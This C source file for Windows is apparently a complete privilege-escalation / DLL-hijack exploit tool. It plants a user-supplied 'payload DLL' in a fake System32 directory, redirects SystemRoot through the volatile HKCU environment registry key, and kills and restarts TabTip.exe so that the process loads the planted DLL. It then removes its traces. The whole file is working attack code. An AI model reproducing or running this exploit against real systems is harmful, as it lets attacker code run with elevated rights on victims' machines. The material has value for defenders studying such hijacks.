#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <tlhelp32.h>

#include <versionhelpers.h>

#define DLLPATH L"\\System32"
#define DLLNAME_NEW     L"\\ApplicationTargetedFeatureDatabase.dll"
#define DLLNAME_CURRENT L"\\windows.storage.dll"
#define DLLNAME_LEGACY  L"\\rsaenh.dll"

#define ENVREGKEY   L"Volatile Environment"
#define ENVREGKEY2  L"Volatile Environment\\0"
#define ENVREGVALUE L"SystemRoot"

#define PROCESS_START_TIMEOUT 2500

#define CreateEnvEntryFunction CreateEnvEntry2
#define DeleteEnvEntryFunction DeleteEnvEntry2

typedef BOOL(*LPTASKHOST_ENUM_CALLBACK)(DWORD pid, void* parameter);

static BOOL FindTabTipProcesses(LPTASKHOST_ENUM_CALLBACK callback, void* parameter)
{
	HANDLE process = NULL;
	PROCESSENTRY32W pe32;
	HANDLE snapshot = NULL;
	BOOL ret = FALSE;

	if (!callback)
	{
		return FALSE;
	}
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		memset(&pe32, 0, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (Process32FirstW(snapshot, &pe32))
		{
			do
			{
				if (!lstrcmpiW(L"tabtip.exe", pe32.szExeFile))
				{
					ret = callback(pe32.th32ProcessID, parameter);
					if (ret)
					{
						break;
					}
				}
			} while (Process32NextW(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return ret;
}

static BOOL TerminateTabTipW(DWORD pid, void* parameter)
{
	HANDLE process = NULL;
	UINT exitcode = (UINT)(ULONG_PTR)parameter;
	process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (process)
	{
		if (TerminateProcess(process, exitcode))
		{
			CloseHandle(process);
			return TRUE;
		}
		CloseHandle(process);
	}
	return FALSE;
}

static BOOL CopyPayloadDLL(WCHAR* dllfile, WCHAR* basepath, BOOL use_old, BOOL copy_fallback)
{
	WCHAR dllpath_dir[MAX_PATH] = { 0 };
	WCHAR dllpath_new[MAX_PATH] = { 0 };
	WCHAR dllpath_cur[MAX_PATH] = { 0 };
	WCHAR dllpath_old[MAX_PATH] = { 0 };
	BOOL has_new_dll = FALSE;

	if (GetSystemDirectoryW(dllpath_new, 100))
	{
		lstrcatW(dllpath_new, DLLNAME_NEW);
		has_new_dll = (GetFileAttributesW(dllpath_new) != INVALID_FILE_ATTRIBUTES);
	}
	(void)lstrcpynW(dllpath_dir, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME_NEW));
	lstrcatW(dllpath_dir, DLLPATH);
	if (!CreateDirectoryW(dllpath_dir, NULL))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return FALSE;
		}
	}
	lstrcpyW(dllpath_new, dllpath_dir);
	lstrcpyW(dllpath_cur, dllpath_dir);
	lstrcpyW(dllpath_old, dllpath_dir);
	lstrcatW(dllpath_new, DLLNAME_NEW);
	lstrcatW(dllpath_cur, DLLNAME_CURRENT);
	lstrcatW(dllpath_old, DLLNAME_LEGACY);
	if (use_old)
	{
		if (!CopyFileW(dllfile, dllpath_old, FALSE))
		{
			RemoveDirectoryW(dllpath_dir);
			return FALSE;
		}
	}
	else if (has_new_dll)
	{
		if (!CopyFileW(dllfile, dllpath_new, FALSE))
		{
			RemoveDirectoryW(dllpath_dir);
			return FALSE;
		}
		if (copy_fallback)
		{
			CopyFileW(dllfile, dllpath_cur, FALSE);
		}
	}
	else if (!CopyFileW(dllfile, dllpath_cur, FALSE))
	{
		RemoveDirectoryW(dllpath_dir);
		return FALSE;
	}
	return TRUE;
}

static BOOL DeletePayloadDLL(WCHAR* basepath)
{
	WCHAR dllpath[MAX_PATH] = { 0 };
	int dir_len = 0;

	(void)lstrcpynW(dllpath, basepath, MAX_PATH - 1 - lstrlenW(DLLPATH) - lstrlenW(DLLNAME_NEW));
	lstrcatW(dllpath, DLLPATH);
	dir_len = lstrlenW(dllpath);
	lstrcpyW(&dllpath[dir_len], DLLNAME_NEW);
	DeleteFileW(dllpath);
	lstrcpyW(&dllpath[dir_len], DLLNAME_CURRENT);
	DeleteFileW(dllpath);
	lstrcpyW(&dllpath[dir_len], DLLNAME_LEGACY);
	DeleteFileW(dllpath);
	dllpath[dir_len] = '\0';
	if (!RemoveDirectoryW(dllpath))
	{
		return FALSE;
	}
	return TRUE;
}

static BOOL CreateEnvEntry2(WCHAR* basepath)
{
	HKEY key = NULL;

	if (RegCreateKeyExW(HKEY_CURRENT_USER, ENVREGKEY2, 0, NULL, REG_OPTION_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL))
	{
		return FALSE;
	}
	if (RegSetValueExW(key, ENVREGVALUE, 0, REG_SZ, (const BYTE*)basepath, lstrlenW(basepath) * sizeof(WCHAR) + sizeof(WCHAR)))
	{
		RegCloseKey(key);
		return FALSE;
	}
	RegCloseKey(key);

	return TRUE;
}

static BOOL DeleteEnvEntry2()
{
	HKEY key = NULL;

	if (RegOpenKeyExW(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_READ, &key))
	{
		return FALSE;
	}
	RegDeleteKeyW(key, L"0");
	RegCloseKey(key);

	return TRUE;
}

static void Cleanup(WCHAR* basepath)
{
	DeleteEnvEntryFunction();
	DeletePayloadDLL(basepath);
}

static BOOL StartTabTip()
{
	SHELLEXECUTEINFOW sei = { 0 };
	WCHAR path[MAX_PATH] = { 0 };

	if (!GetSystemWindowsDirectoryW(path, MAX_PATH))
	{
		lstrcpyW(path, L"C:\\");
	}
	lstrcpyW(&path[3], L"Program Files\\Common Files\\microsoft shared\\ink\\TabTip.exe");
	memset(&sei, 0, sizeof(sei));
	sei.cbSize = sizeof(sei);
	sei.fMask = SEE_MASK_WAITFORINPUTIDLE;
	sei.lpVerb = L"open";
	sei.nShow = SW_SHOWDEFAULT;
	sei.lpFile = path;
	return ShellExecuteExW(&sei);
}

typedef NTSTATUS (WINAPI * __RtlGetVersion)(OSVERSIONINFOW* VersionInformation);

static DWORD GetRealWindowsBuildNumber(void)
{
	HMODULE ntdll = NULL;
	__RtlGetVersion _RtlGetVersion = NULL;
	OSVERSIONINFOW osvi = { 0 };

	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll)
	{
		return 0;
	}
	_RtlGetVersion = (__RtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
	if (!_RtlGetVersion)
	{
		return 0;
	}
	memset(&osvi, 0, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(osvi);
	if (_RtlGetVersion(&osvi))
	{
		return 0;
	}
	return osvi.dwBuildNumber;
}

static void print_help(WCHAR* executable)
{
	wprintf(L"Usage: %ls [dll path]\n", executable);
}

int wmain(int argc, WCHAR** argv)
{
	DWORD i = 0;
	WCHAR cdpath[MAX_PATH];
	DWORD build = 0;
	BOOL win_old = FALSE;
	BOOL fallback = FALSE;

	if (!GetCurrentDirectoryW(MAX_PATH - 1, cdpath))
	{
		wprintf(L"GetCurrentDirectory failed: %u!\n", GetLastError());
		return 1;
	}
	if (argc < 2)
	{
		Cleanup(cdpath);
		print_help(argv[0]);
		return 1;
	}
	if (argc > 2)
	{
		if (argv[2][0] != L'0')
		{
			fallback = TRUE;
		}
	}
	build = GetRealWindowsBuildNumber();
	if (!build)
	{
		wprintf(L"GetRealWindowsBuildNumber failed!\n");
		return 1;
	}
	win_old = FALSE;
	if (build < 14393)
	{
		win_old = TRUE;
	}
	wprintf(L"Copy payload DLL: %ls\n", argv[1]);
	if (!CopyPayloadDLL(argv[1], cdpath, win_old, fallback))
	{
		wprintf(L"CopyPayloadDLL failed: %u!\n", GetLastError());
		return 1;
	}
	wprintf(L"Set environment \"%ls\" value to \"%ls\" ...\n", ENVREGVALUE, cdpath);
	if (!CreateEnvEntryFunction(cdpath))
	{
		wprintf(L"CreateEnvEntryFunction failed: %u!\n", GetLastError());
		DeletePayloadDLL(cdpath);
		return 1;
	}
	wprintf(L"Try (re-)starting tabtip.exe ...\n");
	FindTabTipProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTabTipW, NULL);
	Sleep(50);
	if (!StartTabTip())
	{
		wprintf(L"Starting TabTip failed: %u!\n", GetLastError());
		Cleanup(cdpath);
		return 1;
	}
	wprintf(L"Wait for process to start ...\n");
	Sleep(PROCESS_START_TIMEOUT);
	wprintf(L"Cleanup ...\n");
	Cleanup(cdpath);

	return 0;
}
